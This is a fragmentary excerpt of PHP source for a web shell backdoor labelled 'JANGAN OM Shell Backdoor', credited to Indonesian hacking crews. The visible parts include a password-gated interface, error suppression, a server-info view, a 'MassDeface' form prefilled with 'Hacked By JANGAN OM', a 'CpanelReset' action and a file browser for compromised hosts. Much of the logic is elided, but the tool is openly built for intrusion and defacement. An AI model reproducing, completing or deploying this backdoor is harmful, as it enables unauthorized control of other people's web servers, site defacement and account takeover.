...
Collabs team JANGAN OM ft Indosec Coder Team
*/
session_start();
error_reporting(0);
set_time_limit(0);
...
$password 			= "51722ed3f86a776dd2c6733379127931";
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='copyright' content='JANGAN OM'/>
    ...
    <title>JANGAN OM Shell Backdoor</title>
    <style>
    	body{
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">JANGAN OM</h2><hr>
    	<img src="https://cdn.pixabay.com/photo/2023/10/03/10/38/anonymous-8291188_960_720.png" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="#">JANGAN OM</a></small>
    	</center>
    </div>
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='#'>[ ! ] JANGAN OM [ ! ]</h1>
			<center><p>Kalau Mau Iphone, Tau Kan Harus Ngapain</a></p></center>
			<hr/>";
		//keluar
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By JANGAN OM'></textarea><br/>
	...
	if ($_GET['aksi'] == 'CpanelReset') {
		...
		echo '<div class="table-responsive-lg">
			...
			echo 
				'<tr>
					<td class="text-white">
						<img src="https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/folder_crcopn.png" class="ico"></img> <a href="?dir='.$path.'/'.$dir.'">'.$_dir.'</a></td>
			...
			foreach($scandir as $file){
				...
				echo '<tr>
					...
					if($ext == "php") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959588/php_t8ucvr.png';
					}elseif ($ext == "html") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959430/html_dpwpez.png';
					}elseif ($ext == "css") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959430/css_vnsgwn.png';
					}elseif ($ext == "png") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959430/png_vhisgb.png';
					}elseif ($ext == "jpg") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/jpg_tokzm0.png';
					}elseif ($ext == "jpeg") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/jpeg_gpdbns.png';
					}elseif($ext == "zip") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/zip_ctryph.png';
					}elseif ($ext == "js") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/js_dnktlo.png';
					}elseif ($ext == "ttf") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/ttf_ukieeq.png';
					}elseif ($ext == "otf") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/otf_nyy2md.png';
					}elseif ($ext == "txt") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/txt_dssyhq.png';
					}elseif ($ext == "ico") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/ico_hwzfod.png';
					}elseif ($ext == "conf") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/conf_lw4qtg.png';
					}elseif ($ext == "htaccess") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/htaccess_owjoq3.png';
					}elseif ($ext == "sh") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/sh_upinsd.png';
					}elseif ($ext == "py") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/py_pvkxus.png';
					}elseif ($ext == "sql") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/sql_gwrzas.png';
					}elseif ($ext == "pl") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959429/pl_khem6e.png';
					}elseif ($ext == "pdf") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/pdf_xgs0yl.png';
					}elseif ($ext == "mp4") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/mp4_t5t0az.png';
					}elseif ($ext == "mp3") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/mp3_f4eiup.png';
					}elseif ($ext == "git") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/git_sukner.png';
					}elseif ($ext == "md") {
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959428/md_n158op.png';
					}else{
						echo 'https://res.cloudinary.com/dgt1czqly/image/upload/v1723959427/docs_f1yc8j.png';
					}
					echo '" class="ico2"></img>';
...
if($ext == "php") {
		...
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="#">JANGAN OM</a></small></center>';
?>
